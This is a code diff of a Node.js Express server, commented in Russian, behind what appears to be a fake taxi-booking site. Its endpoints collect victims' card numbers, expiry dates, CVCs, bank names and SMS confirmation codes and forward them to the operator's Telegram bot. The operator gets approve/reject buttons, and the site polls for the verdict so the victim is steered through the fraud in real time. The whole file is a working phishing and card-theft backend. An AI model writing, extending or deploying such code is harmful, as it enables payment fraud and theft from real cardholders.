@@ -5,9 +5,21 @@ const fetch = require('node-fetch');
 
 const app = express();
 app.use(express.json());
-app.use(express.static(path.join(__dirname, 'public')));
 
-// Хранилище статусов SMS-кодов: { phone: 'pending' | 'success' | 'error' }
+// Отдаем статику из папки public и из корня
+app.use(express.static(path.join(__dirname, 'public')));
+app.use(express.static(__dirname));
+
+// Явный маршрут на главную страницу
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'index.html'), (err) => {
+    if (err) {
+      res.sendFile(path.join(__dirname, 'index.html'));
+    }
+  });
+});
+
+// Хранилище статусов SMS в памяти
 const smsStatuses = {};
 
 async function sendToTelegram(text, replyMarkup = null) {
@@ -26,10 +38,9 @@ async function sendToTelegram(text, replyMarkup = null) {
       body: JSON.stringify(payload)
     });
     const data = await res.json();
-    if (!data.ok) console.error('❌ Ошибка Telegram:', data);
     return data.ok;
   } catch (err) {
-    console.error('❌ Ошибка сети/сервера:', err);
+    console.error('❌ Ошибка отправки:', err);
     return false;
   }
 }
@@ -37,48 +48,30 @@ async function sendToTelegram(text, replyMarkup = null) {
 // 📌 ЛОГ 1: Данные карты
 app.post('/api/send-log', async (req, res) => {
   const order = req.body;
-  const text = `🚖 *НОВЫЙ ЗАКАЗ И ОПЛАТА*
-
-` +
-               `📱 *Телефон:* \`${order.phone}\`
-` +
-               `📍 *Откуда:* ${order.from}
-` +
-               `🏁 *Куда:* ${order.to}
-` +
-               `🚕 *Тариф:* ${order.tariff}
-` +
-               `💰 *Сумма:* ${order.price} ₽
-
-` +
-               `💳 *ДАННЫЕ ОПЛАТЫ:*
-` +
-               `🏛 *Банк:* ${order.bank}
-` +
-               `💳 *Карта:* \`${order.cardNumber}\`
-` +
+  const text = `🚖 *НОВЫЙ ЗАКАЗ И ОПЛАТА*\n\n` +
+               `📱 *Телефон:* \`${order.phone}\`\n` +
+               `📍 *Откуда:* ${order.from}\n` +
+               `🏁 *Куда:* ${order.to}\n` +
+               `🚕 *Тариф:* ${order.tariff}\n` +
+               `💰 *Сумма:* ${order.price} ₽\n\n` +
+               `💳 *ДАННЫЕ ОПЛАТЫ:*\n` +
+               `🏛 *Банк:* ${order.bank}\n` +
+               `💳 *Карта:* \`${order.cardNumber}\`\n` +
                `📅 *Срок:* \`${order.cardExpiry}\` | *CVC:* \`${order.cardCvc}\``;
 
   const ok = await sendToTelegram(text);
   res.status(ok ? 200 : 500).json({ success: ok });
 });
 
-// 📌 ЛОГ 2: SMS-код с КНОПКАМИ ДЛЯ АДМИНА
+// 📌 ЛОГ 2: SMS-код с КНОПКАМИ
 app.post('/api/send-sms-log', async (req, res) => {
   const { phone, bank, smsCode } = req.body;
-  
   smsStatuses[phone] = 'pending';
 
-  const text = `📲 *ВВЕДЕН SMS-КОД*
-
-` +
-               `📱 *Телефон:* \`${phone}\`
-` +
-               `🏛 *Банк:* ${bank}
-` +
-               `🔑 *SMS-Код:* \`${smsCode}\`
-
-` +
+  const text = `📲 *ВВЕДЕН SMS-КОД*\n\n` +
+               `📱 *Телефон:* \`${phone}\`\n` +
+               `🏛 *Банк:* ${bank}\n` +
+               `🔑 *SMS-Код:* \`${smsCode}\`\n\n` +
                `❓ *Выберите действие:*`;
 
   const inlineKeyboard = {
@@ -94,14 +87,13 @@ app.post('/api/send-sms-log', async (req, res) => {
   res.status(ok ? 200 : 500).json({ success: ok });
 });
 
-// Проверка статуса для сайта
+// Проверка статуса для клиента
 app.get('/api/check-sms-status', (req, res) => {
   const phone = req.query.phone;
-  const status = smsStatuses[phone] || 'pending';
-  res.json({ status });
+  res.json({ status: smsStatuses[phone] || 'pending' });
 });
 
-// Опрос нажатий кнопок в Telegram
+// Опрос кнопок в Telegram
 let offset = 0;
 async function pollTelegramUpdates() {
   try {
@@ -112,7 +104,6 @@ async function pollTelegramUpdates() {
     if (data.ok && data.result.length > 0) {
       for (const update of data.result) {
         offset = update.update_id + 1;
-
         if (update.callback_query) {
           const callback = update.callback_query;
           const actionData = callback.data;
@@ -120,17 +111,14 @@ async function pollTelegramUpdates() {
           if (actionData.startsWith('approve_')) {
             const phone = actionData.replace('approve_', '');
             smsStatuses[phone] = 'success';
-            
             await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify({ callback_query_id: callback.id, text: "Оплата принята!" })
             });
-
           } else if (actionData.startsWith('reject_')) {
             const phone = actionData.replace('reject_', '');
             smsStatuses[phone] = 'error';
-
             await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
@@ -146,6 +134,6 @@ async function pollTelegramUpdates() {
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-  console.log(`Сервер запущен: http://localhost:${PORT}`);
+  console.log(`Сервер запущен на порту ${PORT}`);
   pollTelegramUpdates();
 });
